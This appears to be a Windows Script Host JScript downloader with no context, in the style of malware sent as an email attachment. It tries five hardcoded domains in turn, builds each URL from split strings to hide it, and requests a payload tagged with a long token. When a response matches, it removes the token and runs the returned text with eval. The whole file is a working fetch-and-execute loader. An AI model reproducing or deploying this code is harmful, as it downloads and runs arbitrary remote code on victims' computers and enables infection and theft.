
var x = "bv.truecompassdesigns.net selectairconditioning.com grandrapidsnonprofits.com delta.truecompassdesigns.net bandiloo.com".split(" ");
var m = "0000001KzrnASzaY1QW7AaA2mCKagczTJaUtLwRsrRT59xCr-l5pY8hfDVZ_eN3cYAto2sj_fIrO0QiSmlddYZj5ISJuAs_WtZZWu3A-vTJkdUY8GOU9bw";
for (var i=0; i<x.length; i++)
{
	var e = WScript.CreateObject("M"+"SXML2.XMLHTTP");	
	try
	{
		var ter = '/';
		e.open('GET', 
		"h"+"t"+"tp"+":/"+ter+x[i]+ter+"c"+"o"+"unter/?"+m,
		
		false);
		e.send();

		var r = e.responseText;

		if (r.length > 1000 && r.indexOf(m) > -1)
		{
			var ikagdh = r.split(m).join("a");
			eval(ikagdh);

			break;
		};
	}
	catch(e)
	{
	};
};